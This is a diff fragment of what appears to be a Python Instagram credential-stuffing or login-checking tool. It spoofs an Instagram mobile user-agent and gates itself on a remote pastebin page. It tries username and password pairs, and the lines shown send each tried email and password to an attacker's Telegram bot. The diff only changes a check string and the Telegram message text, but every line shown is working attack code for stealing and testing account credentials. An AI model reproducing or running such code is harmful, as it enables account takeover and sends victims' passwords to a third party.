@@ -196,7 +196,7 @@ headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x
 
 w = 'https://pastebin.com/aXTrUmsa'
 rss = requests.get(w).text
-if '[DARK]' in rss:
+if 'DARK' in rss:
     sleep(2)
     user = '1234567890'
     while True:
@@ -227,7 +227,7 @@ if '[DARK]' in rss:
         elif '"message":"challenge_required","challenge"' in req.json():
             print (S+'user : '+username+': passw : '+password)
         else:
-            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=HI DARK HI HAMA DLM\n==================\n✅GOOD[{zz}]\n================== \n⛔BAD \n⛔Email《 {username}  》=>  《{aa}》\n⛔password《 {password} 》=> 《{aa}》\n=====================\n BOD BY DARK")
+            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Wait... 🐥  \n==================\n🐥GOOD[{zz}]\n================== \n⛔BAD \n⛔Email《 {username}  》=>  《{aa}》\n⛔password《 {password} 》=> 《{aa}》\n=====================\n BOD BY DARK")
             print (E+'user : '+username+': passw : '+password)
             aa+=1
 #DARK
